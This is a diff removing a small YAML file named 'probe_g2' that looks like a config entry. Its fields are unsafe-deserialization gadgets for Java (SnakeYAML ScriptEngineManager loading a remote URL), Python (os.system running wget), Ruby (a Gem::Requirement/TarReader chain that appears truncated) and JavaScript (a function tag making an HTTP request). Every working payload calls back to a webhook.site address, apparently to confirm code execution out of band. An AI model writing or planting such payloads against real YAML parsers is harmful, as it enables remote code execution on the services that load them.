@@ -1,8 +1,0 @@
-name: probe_g2
-description: g2
-kind: Boolean
-a: !!javax.script.ScriptEngineManager [!!java.net.URL ["http://webhook.site/fcf51b26-7565-4939-ae43-183e62117a14/g2-java"]]
-b: !!python/object/apply:os.system ["wget -q -O- http://webhook.site/fcf51b26-7565-4939-ae43-183e62117a14/g2-py"]
-c: !ruby/object:Gem::Requirement
-  requirements: !ruby/object:Gem::Package::TarReader
-d: !<tag:yaml.org,2002:js/function> "function(){require('http').get('http://webhook.site/fcf51b26-7565-4939-ae43-183e62117a14/g2-js')}"
